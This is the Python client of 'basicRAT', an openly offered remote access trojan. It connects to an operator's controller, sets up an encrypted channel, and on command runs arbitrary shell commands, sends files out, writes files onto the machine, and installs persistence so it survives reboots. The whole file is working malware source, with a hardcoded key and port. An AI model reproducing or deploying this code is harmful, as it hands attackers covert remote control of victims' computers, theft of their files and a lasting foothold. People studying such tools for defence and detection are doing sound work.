#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import subprocess
import struct
import sys

from core import common
from core import crypto
from core import filesock
from core import persistence


HOST    = 'localhost'
PORT    = 1338
FB_KEY  = '82e672ae054aa4de6f042c888111686a'
# generate your own key with...
# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"


def main():
    s = socket.socket()
    s.connect((HOST, PORT))

    DHKEY = crypto.diffiehellman(s)
    # debug: confirm DHKEY matches
    # print binascii.hexlify(DHKEY)

    while True:
        data = s.recv(1024)
        data = crypto.AES_decrypt(data, DHKEY)

        # seperate prompt into command and action
        cmd, _, action = data.partition(' ')

        # stop client
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # run command
        elif cmd == 'run':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(crypto.AES_encrypt(results, DHKEY))

        # send file
        elif cmd == 'download':
            for fname in action.split():
                fname = fname.strip()
                filesock.sendfile(s, fname, DHKEY)

        # receive file
        elif cmd == 'upload':
            for fname in action.split():
                fname = fname.strip()
                filesock.recvfile(s, fname, DHKEY)

        # regenerate DH key (dangerous! may cause connection loss)
        # available in case a fallback occurs or you suspect evesdropping
        elif cmd == 'rekey':
            DHKEY = crypto.diffiehellman(s)

        # apply persistence mechanism
        elif cmd == 'persistence':
            success, details = persistence.run()
            if success:
                results = 'Persistence successful, {}.'.format(details)
            else:
                results = 'Persistence unsuccessful, {}.'.format(details)
            s.send(crypto.AES_encrypt(results, DHKEY))


if __name__ == '__main__':
    main()
